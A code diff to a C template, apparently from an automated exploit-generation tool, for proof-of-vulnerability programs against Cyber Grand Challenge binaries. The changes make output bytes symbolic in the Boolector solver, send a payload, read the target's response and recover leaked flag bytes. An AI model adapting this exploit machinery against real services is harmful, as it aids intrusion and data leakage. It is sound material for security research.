@@ -5,10 +5,11 @@ c_template = """
 #include <string.h>
 
 /* global output data */
-char *output;
-size_t output_size;
-unsigned int cgc_flag_data_idx;
+BoolectorNode *output_val = NULL;
+size_t output_size = 0;
 char received_data[{recv_buf_len}];
+size_t recv_off = 0;
+int num_symbols = 0;
 
 enum register_t
 {
@@ -73,6 +74,24 @@ size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
   return len;
 }
 
+int send_all(int fd, const void *msg, size_t n_bytes)
+{
+  size_t len = 0;
+  size_t tx = 0;
+  while(len < n_bytes) {
+    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
+      return 1;
+    }
+    len += tx;
+  }
+  return 0;
+}
+
+void debug_print(const char *msg) {
+  size_t len = (size_t)strlen(msg);
+  transmit(2, msg, len, 0);
+}
+
 int fd_ready_timeout(int fd, int timeout_us) {
   struct timeval tv;
   fd_set rfds;
@@ -105,6 +124,7 @@ size_t receive_n_timeout( int fd, void *dst_buf, size_t n_bytes, int timeout_us 
     if (!fd_ready_timeout(fd, timeout_us)) {
       return len;
     }
+
     if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
       len = 0;
       break;
@@ -141,19 +161,6 @@ size_t blank_receive( int fd, size_t n_bytes )
   return len;
 }
 
-int send_all(int fd, const void *msg, size_t n_bytes)
-{
-  size_t len = 0;
-  size_t tx = 0;
-  while(len < n_bytes) {
-    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
-      return 1;
-    }
-    len += tx;
-  }
-  return 0;
-}
-
 char to_char(char *str) {
   int i;
   char r = '\\0';
@@ -172,24 +179,32 @@ void to_bits(char *dst, char c) {
     }
 }
 
-void append_byte_to_output(int byte_idx) {
+void make_new_symbol(char symbol_name[0x40]) {
+  num_symbols++;
+  memset(symbol_name, 0, 0x40);
+  sprintf(symbol_name, "sym_%d", num_symbols);
+}
 
-    // convert it to a bitstring
-    if (output)
-        output = realloc(output, output_size + 8 + 1); 
-    else
-        output = malloc(8 + 1); 
+void append_byte_to_output(Btor *btor, size_t byte_idx) {
+    BoolectorNode *new_byte;
+    // if the byte has been read in we use a concrete bv
+    if (byte_idx < recv_off) {
+      new_byte = boolector_unsigned_int(btor, received_data[byte_idx], 8);
+    }
+    else {
+      // if the byte has not been read in yet, we use a new symbolic value
+      char symbol_name[0x40];
+      make_new_symbol(symbol_name);
+      new_byte = boolector_var(btor, 8, symbol_name);
+    }
 
-    char *bitbuf = output;
-    if (!bitbuf)
-      die("bitbuf malloc failed");
-
-    to_bits(bitbuf + output_size, received_data[byte_idx]);
-
-    bitbuf[output_size + 8] = '\\0';
-
-    /* update output size */
-    output_size = output_size + 8;
+    /* update output */
+    if (output_val == NULL) {
+      output_val = new_byte;
+    }
+    else {
+      output_val = boolector_concat(btor, output_val, new_byte);
+    }
 }
 
 typedef struct type1_vals_ {
@@ -263,12 +278,10 @@ int type2_submit(const unsigned char *val, size_t len) {
 }
 
 void constrain_output_var(Btor *btor, int output_var_idx) {
-  cgc_flag_data_idx = 5 - output_var_idx;
-
+  output_val = NULL;
   {byte_getting_code}
 
   BoolectorNode *output_val_var = boolector_match_node_by_id(btor, output_var_idx);
-  BoolectorNode *output_val = boolector_const(btor, output);
   BoolectorNode *con = boolector_eq(btor, output_val_var, output_val);
   boolector_assert(btor, con);
 }
@@ -290,22 +303,25 @@ int do_pov() {
 
   // current position in the payload
   size_t payload_off = 0;
-  size_t recv_off = 0;
 
   // BoolectorNodes for use in challenge response
   BoolectorNode *stdout_val_var;
   BoolectorNode *stdout_val;
   BoolectorNode *stdout_con;
+  BoolectorNode *payload_val;
+  BoolectorNode *payload_val_var;
+  BoolectorNode *payload_con;
 
-  send_all(1, payload+payload_off, payload_len-payload_off);
-
-  recv_off += receive_n_timeout(0, received_data+recv_off, {recv_buf_len}, 500000);
   {solver_code}
 
-  BoolectorNode *cgc_flag_var = boolector_match_node_by_id(btor_0, cgc_flag_data_idx);
+  if (payload_off < payload_len) {
+    send_all(1, payload+payload_off, payload_len-payload_off);
+  }
+  recv_off += receive_n_timeout(0, received_data+recv_off, {recv_buf_len} - recv_off, 500000);
 
-  char *flag_data = boolector_bv_assignment(btor_0, cgc_flag_var);
+  BoolectorNode *cgc_flag_var = boolector_match_node_by_id({btor_name}, {cgc_flag_data_idx});
 
+  char *flag_data = boolector_bv_assignment({btor_name}, cgc_flag_var);
   char flag[4];
 
   flag[0] = to_char(flag_data + {flag_byte_1} * 8);
